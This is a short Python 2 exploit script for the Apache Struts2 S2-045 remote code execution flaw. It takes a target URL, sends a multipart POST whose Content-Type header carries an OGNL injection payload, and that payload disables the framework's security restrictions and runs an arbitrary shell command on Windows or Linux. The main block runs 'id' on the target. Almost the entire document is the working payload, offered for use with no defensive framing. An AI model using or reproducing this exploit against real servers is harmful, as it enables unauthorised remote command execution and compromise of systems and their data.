#coding:utf-8
import requests,sys
if len(sys.argv) != 2:
        print """usage: %s URL:(http://.....)""" % sys.argv[0]
        sys.exit(1)
url=str(sys.argv[1])
if url.find("http") == -1:
        print "Invalid URL: The URL must include http"
else:
 def s2_045(url, cmd):
    f = open("test.txt","a")
    f.close()
    data = {"image1": open("test.txt", "rb")}
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
                "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
                (#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\
                (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
                (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).\
                (#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').\
                toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\
                (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).\
                (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\
                (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"}
    req = requests.post(url, data=data, headers=headers)

    return req.text


 if __name__ == '__main__':
    print s2_045(url, 'id')
 
